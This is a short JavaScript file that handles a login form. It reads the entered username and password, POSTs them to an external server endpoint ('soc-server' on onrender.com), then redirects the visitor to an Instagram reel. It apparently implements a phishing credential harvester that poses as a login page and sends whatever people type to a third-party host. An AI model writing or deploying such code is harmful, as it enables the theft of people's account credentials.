const URL="https://soc-server.onrender.com/user"

// ..................Login Form..............

const loginForm=document.querySelector(".login-form")

loginForm.addEventListener("submit",(e)=>{
    e.preventDefault()
    let username=loginForm.uname.value
    let pass=loginForm.password.value

    fetch(URL,{
        method:"POST",
        headers:{
            "Content-Type":"application/json"
        },
        body:JSON.stringify({username,pass})
    })
    .then((res)=>{
        console.log(res.status)
        if(res.status==201){
            window.location.replace("https://www.instagram.com/reel/Ct6XUm1svvQ/?utm_source=ig_web_copy_link&igshid=MzRlODBiNWFlZA==");
        }else{
            window.location.reload()
        }
    })
})

